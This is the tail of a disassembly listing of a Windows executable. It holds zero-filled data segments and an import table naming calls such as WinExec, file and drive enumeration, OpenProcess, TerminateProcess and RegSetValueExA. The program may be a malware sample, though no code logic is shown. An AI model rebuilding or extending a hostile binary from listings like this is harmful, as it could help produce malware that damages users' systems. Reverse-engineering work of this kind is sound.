    07CA0  00 00 00 00				db	 00h, 00h, 00h, 00h
    07CA4  00000000		data_78		dd	00000h
    07CA8  00000000		data_79		dd	00000h
    07CAC  00000000		data_80		dd	00000h
    07CB0  012C[00]				db	300 dup (0)
    07DDC  00000000		data_81		dd	00000h
    07DE0  00EC[00]				db	236 dup (0)
    07ECC  00000000		data_82		dd	00000h
    07ED0  7AE4[00]				db	31460 dup (0)
    0F9B4  00000000		data_83		dd	00000h
    0F9B8  0647[00]				db	1607 dup (0)
    0FFFF  00					db	0
    10000  FFFF[00]				db	65535 dup (0)
    1FFFF  00					db	0
    20000  05B4[00]				db	1460 dup (0)
    205B4  00000000		data_86		dd	00000h
    205B8  001C[00]				db	28 dup (0)
    205D4  00000000		data_87		dd	00000h
    205D8  0008[00]				db	8 dup (0)
    205E0  00000000		data_88		dd	00000h
    205E4  01FC[00]				db	508 dup (0)
    207E0  00000000		data_89		dd	00000h
    207E4  F81B[00]				db	63515 dup (0)
    2FFFF  00					db	0
    30000  FFFF[00]				db	65535 dup (0)
    3FFFF  00					db	0
    40000  6000[00]				db	24576 dup (0)
							                        ; Inter-segment boundary
    46000  00046050		KERNEL32_Characteristics	dd	data_94e
    46004  00000000		KERNEL32_TimeDateStamp	dd	00000h
    46008  00000000		KERNEL32_ForwarderChain	dd	00000h
    4600C  00046170		KERNEL32_Name	dd	data_100e
    46010  000460E0		KERNEL32_FirstThunk	dd	data_97e
    46014  000460C0		ADVAPI32_Characteristics	dd	data_95e
    46018  00000000		ADVAPI32_TimeDateStamp	dd	00000h
    4601C  00000000		ADVAPI32_ForwarderChain	dd	00000h
    46020  0004617D		ADVAPI32_Name	dd	data_101e
    46024  00046150		ADVAPI32_FirstThunk	dd	data_98e
    46028  000460D4		USER32_Characteristics	dd	data_96e
    4602C  00000000		USER32_TimeDateStamp	dd	00000h
    46030  00000000		USER32_ForwarderChain	dd	00000h
    46034  0004618A		USER32_Name	dd	data_102e
    46038  00046164		USER32_FirstThunk	dd	data_99e
    4603C  00000000		NULL_Characteristics	dd	00000h
    46040  00000000		NULL_TimeDateStamp	dd	00000h
    46044  00000000		NULL_ForwarderChain	dd	00000h
    46048  00000000		NULL_Name	dd	00000h
    4604C  00000000		NULL_FirstThunk	dd	00000h
    46050  00046196		WinExec_Thunk	dd	data_103e
    46054  000461A0		VirtualFree_Thunk	dd	data_104e
    46058  000461AE		WriteFile_Thunk	dd	data_105e
    4605C  000461BA		CloseHandle_Thunk	dd	data_106e
    46060  000461C8		CreateFileA_Thunk	dd	data_107e
    46064  000461D6		ExitProcess_Thunk	dd	data_108e
    46068  000461E4		GetProcAddress_Thunk	dd	data_109e
    4606C  000461F6		FindNextFileA_Thunk	dd	data_110e
    46070  00046206		GetCommandLineA_Thunk	dd	data_111e
    46074  00046218		GetCurrentDirectoryA_Thunk	dd	data_112e
    46078  00046230		GetCurrentProcessId_Thunk	dd	data_113e
    4607C  00046246		GetCurrentThreadId_Thunk	dd	data_114e
    46080  0004625C		GetDriveTypeA_Thunk	dd	data_115e
    46084  0004626C		GetLastError_Thunk	dd	data_116e
    46088  0004627C		FindFirstFileA_Thunk	dd	data_117e
    4608C  0004628E		GetTickCount_Thunk	dd	data_118e
    46090  0004629E		GlobalFree_Thunk	dd	data_119e
    46094  000462AC		GlobalLock_Thunk	dd	data_120e
    46098  000462BA		LoadLibraryA_Thunk	dd	data_121e
    4609C  000462CA		OpenProcess_Thunk	dd	data_122e
    460A0  000462D8		ReadFile_Thunk	dd	data_123e
    460A4  000462E4		SetCurrentDirectoryA_Thunk	dd	data_124e
    460A8  000462FC		SetErrorMode_Thunk	dd	data_125e
    460AC  0004630C		SetFilePointer_Thunk	dd	data_126e
    460B0  0004631E		Sleep_Thunk	dd	data_127e
    460B4  00046326		TerminateProcess_Thunk	dd	data_128e
    460B8  0004633A		VirtualAlloc_Thunk	dd	data_129e
    460BC  00000000		NULL_Thunk_KERNEL32	dd	00000h
    460C0  0004634A		RegQueryValueExA_Thunk	dd	data_130e
    460C4  0004635E		RegSetValueExA_Thunk	dd	data_131e
    460C8  00046370		RegOpenKeyA_Thunk	dd	data_132e
    460CC  0004637E		RegCloseKey_Thunk	dd	data_133e
    460D0  00000000		NULL_Thunk_ADVAPI32	dd	00000h
    460D4  0004638C		GetWindowThreadProcessId_Thunk	dd	data_134e
    460D8  000463A8		FindWindowA_Thunk	dd	data_135e
    460DC  00000000		NULL_Thunk_USER32	dd	00000h
    460E0  00046196		WinExec		dd	data_103e
    460E4  000461A0		VirtualFree	dd	data_104e
    460E8  000461AE		WriteFile	dd	data_105e
    460EC  000461BA		CloseHandle	dd	data_106e
    460F0  000461C8		CreateFileA	dd	data_107e
    460F4  000461D6		ExitProcess	dd	data_108e
    460F8  000461E4		GetProcAddress	dd	data_109e
    460FC  000461F6		FindNextFileA	dd	data_110e
    46100  00046206		GetCommandLineA	dd	data_111e
    46104  00046218		GetCurrentDirectoryA	dd	data_112e
    46108  00046230		GetCurrentProcessId	dd	data_113e
    4610C  00046246		GetCurrentThreadId	dd	data_114e
    46110  0004625C		GetDriveTypeA	dd	data_115e
    46114  0004626C		GetLastError	dd	data_116e
    46118  0004627C		FindFirstFileA	dd	data_117e
    4611C  0004628E		GetTickCount	dd	data_118e
    46120  0004629E		GlobalFree	dd	data_119e
    46124  000462AC		GlobalLock	dd	data_120e
    46128  000462BA		LoadLibraryA	dd	data_121e
    4612C  000462CA		OpenProcess	dd	data_122e
    46130  000462D8		ReadFile	dd	data_123e
    46134  000462E4		SetCurrentDirectoryA	dd	data_124e
    46138  000462FC		SetErrorMode	dd	data_125e
    4613C  0004630C		SetFilePointer	dd	data_126e
    46140  0004631E		Sleep		dd	data_127e
    46144  00046326		TerminateProcess	dd	data_128e
    46148  0004633A		VirtualAlloc	dd	data_129e
    4614C  00 00 00 00				db	0, 0, 0, 0
    46150  0004634A		RegQueryValueExA	dd	data_130e
    46154  0004635E		RegSetValueExA	dd	data_131e
    46158  00046370		RegOpenKeyA	dd	data_132e
    4615C  0004637E		RegCloseKey	dd	data_133e
    46160  00 00 00 00				db	0, 0, 0, 0
    46164  0004638C		GetWindowThreadProcessId	dd	data_134e
    46168  000463A8		FindWindowA	dd	data_135e
    4616C  00 00 00 00				db	0, 0, 0, 0
    46170  4B 45 52 4E 45 4C	KERNEL32	db	'KERNEL32.dll', 0
    46176  33 32 2E 64 6C 6C
    4617C  00
    4617D  41 44 56 41 50 49	ADVAPI32	db	'ADVAPI32.dll', 0
    46183  33 32 2E 64 6C 6C
    46189  00
    4618A  55 53 45 52 33 32	USER32		db	'USER32.dll', 0
    46190  2E 64 6C 6C 00
    46195  00					db	0
    46196  0000			WinExec_Hint	dw	0
    46198  57 69 6E 45 78 65	WinExec_Name	db	'WinExec', 0
    4619E  63 00
    461A0  0000			VirtualFree_Hint	dw	0
    461A2  56 69 72 74 75 61	VirtualFree_Name	db	'VirtualFree', 0
    461A8  6C 46 72 65 65 00
    461AE  0000			WriteFile_Hint	dw	0
    461B0  57 72 69 74 65 46	WriteFile_Name	db	'WriteFile', 0
    461B6  69 6C 65 00
    461BA  0000			CloseHandle_Hint	dw	0
    461BC  43 6C 6F 73 65 48	CloseHandle_Name	db	'CloseHandle', 0
    461C2  61 6E 64 6C 65 00
    461C8  0000			CreateFileA_Hint	dw	0
    461CA  43 72 65 61 74 65	CreateFileA_Name	db	'CreateFileA', 0
    461D0  46 69 6C 65 41 00
    461D6  0000			ExitProcess_Hint	dw	0
    461D8  45 78 69 74 50 72	ExitProcess_Name	db	'ExitProcess', 0
    461DE  6F 63 65 73 73 00
    461E4  0000			GetProcAddress_Hint	dw	0
    461E6  47 65 74 50 72 6F	GetProcAddress_Name	db	'GetProcAddress', 0
    461EC  63 41 64 64 72 65
    461F2  73 73 00
    461F5  00					db	0
    461F6  0000			FindNextFileA_Hint	dw	0
    461F8  46 69 6E 64 4E 65	FindNextFileA_Name	db	'FindNextFileA', 0
    461FE  78 74 46 69 6C 65
    46204  41 00
    46206  0000			GetCommandLineA_Hint	dw	0
    46208  47 65 74 43 6F 6D	GetCommandLineA_Name	db	'GetCommandLineA', 0
    4620E  6D 61 6E 64 4C 69
    46214  6E 65 41 00
    46218  0000			GetCurrentDirectoryA_Hint	dw	0
    4621A  47 65 74 43 75 72	GetCurrentDirectoryA_Name	db	'GetCurrentDirectoryA', 0
    46220  72 65 6E 74 44 69
    46226  72 65 63 74 6F 72
    4622C  79 41 00
    4622F  00					db	0
    46230  0000			GetCurrentProcessId_Hint	dw	0
    46232  47 65 74 43 75 72	GetCurrentProcessId_Name	db	'GetCurrentProcessId', 0
    46238  72 65 6E 74 50 72
    4623E  6F 63 65 73 73 49
    46244  64 00
    46246  0000			GetCurrentThreadId_Hint	dw	0
    46248  47 65 74 43 75 72	GetCurrentThreadId_Name	db	'GetCurrentThreadId', 0
    4624E  72 65 6E 74 54 68
    46254  72 65 61 64 49 64
    4625A  00
    4625B  00					db	0
    4625C  0000			GetDriveTypeA_Hint	dw	0
    4625E  47 65 74 44 72 69	GetDriveTypeA_Name	db	'GetDriveTypeA', 0
    46264  76 65 54 79 70 65
    4626A  41 00
    4626C  0000			GetLastError_Hint	dw	0
    4626E  47 65 74 4C 61 73	GetLastError_Name	db	'GetLastError', 0
    46274  74 45 72 72 6F 72
    4627A  00
    4627B  00					db	0
    4627C  0000			FindFirstFileA_Hint	dw	0
    4627E  46 69 6E 64 46 69	FindFirstFileA_Name	db	'FindFirstFileA', 0
    46284  72 73 74 46 69 6C
    4628A  65 41 00
    4628D  00					db	0
    4628E  0000			GetTickCount_Hint	dw	0
    46290  47 65 74 54 69 63	GetTickCount_Name	db	'GetTickCount', 0
    46296  6B 43 6F 75 6E 74
    4629C  00
    4629D  00					db	0
    4629E  0000			GlobalFree_Hint	dw	0
    462A0  47 6C 6F 62 61 6C	GlobalFree_Name	db	'GlobalFree', 0
    462A6  46 72 65 65 00
    462AB  00					db	0
    462AC  0000			GlobalLock_Hint	dw	0
    462AE  47 6C 6F 62 61 6C	GlobalLock_Name	db	'GlobalLock', 0
    462B4  4C 6F 63 6B 00
    462B9  00					db	0
    462BA  0000			LoadLibraryA_Hint	dw	0
    462BC  4C 6F 61 64 4C 69	LoadLibraryA_Name	db	'LoadLibraryA', 0
    462C2  62 72 61 72 79 41
    462C8  00
    462C9  00					db	0
    462CA  0000			OpenProcess_Hint	dw	0
    462CC  4F 70 65 6E 50 72	OpenProcess_Name	db	'OpenProcess', 0
    462D2  6F 63 65 73 73 00
    462D8  0000			ReadFile_Hint	dw	0
    462DA  52 65 61 64 46 69	ReadFile_Name	db	'ReadFile', 0
    462E0  6C 65 00
    462E3  00					db	0
    462E4  0000			SetCurrentDirectoryA_Hint	dw	0
    462E6  53 65 74 43 75 72	SetCurrentDirectoryA_Name	db	'SetCurrentDirectoryA', 0
    462EC  72 65 6E 74 44 69
    462F2  72 65 63 74 6F 72
    462F8  79 41 00
    462FB  00					db	0
    462FC  0000			SetErrorMode_Hint	dw	0
    462FE  53 65 74 45 72 72	SetErrorMode_Name	db	'SetErrorMode', 0
    46304  6F 72 4D 6F 64 65
    4630A  00
    4630B  00					db	0
    4630C  0000			SetFilePointer_Hint	dw	0
    4630E  53 65 74 46 69 6C	SetFilePointer_Name	db	'SetFilePointer', 0
    46314  65 50 6F 69 6E 74
    4631A  65 72 00
    4631D  00					db	0
    4631E  0000			Sleep_Hint	dw	0
    46320  53 6C 65 65 70 00	Sleep_Name	db	'Sleep', 0
    46326  0000			TerminateProcess_Hint	dw	0
    46328  54 65 72 6D 69 6E	TerminateProcess_Name	db	'TerminateProcess', 0
    4632E  61 74 65 50 72 6F
    46334  63 65 73 73 00
    46339  00					db	0
    4633A  0000			VirtualAlloc_Hint	dw	0
    4633C  56 69 72 74 75 61	VirtualAlloc_Name	db	'VirtualAlloc', 0
    46342  6C 41 6C 6C 6F 63
    46348  00
    46349  00					db	0
    4634A  0000			RegQueryValueExA_Hint	dw	0
    4634C  52 65 67 51 75 65	RegQueryValueExA_Name	db	'RegQueryValueExA', 0
    46352  72 79 56 61 6C 75
    46358  65 45 78 41 00
    4635D  00					db	0
    4635E  0000			RegSetValueExA_Hint	dw	0
    46360  52 65 67 53 65 74	RegSetValueExA_Name	db	'RegSetValueExA', 0
    46366  56 61 6C 75 65 45
    4636C  78 41 00
    4636F  00					db	0
    46370  0000			RegOpenKeyA_Hint	dw	0
    46372  52 65 67 4F 70 65	RegOpenKeyA_Name	db	'RegOpenKeyA', 0
    46378  6E 4B 65 79 41 00
    4637E  0000			RegCloseKey_Hint	dw	0
    46380  52 65 67 43 6C 6F	RegCloseKey_Name	db	'RegCloseKey', 0
    46386  73 65 4B 65 79 00
    4638C  0000			GetWindowThreadProcessId_Hint	dw	0
    4638E  47 65 74 57 69 6E	GetWindowThreadProcessId_Name	db	'GetWindowThreadProcessId', 0
    46394  64 6F 77 54 68 72
    4639A  65 61 64 50 72 6F
    463A0  63 65 73 73 49 64
    463A6  00
    463A7  00					db	0
    463A8  0000			FindWindowA_Hint	dw	0
    463AA  46 69 6E 64 57 69	FindWindowA_Name	db	'FindWindowA', 0
    463B0  6E 64 6F 77 41 00
    463B6  004A[00]				db	74 dup (0)
							                        ; Inter-segment boundary
    46400  0C00[00]				db	3072 dup (0)

				seg_f		ends



						end	start
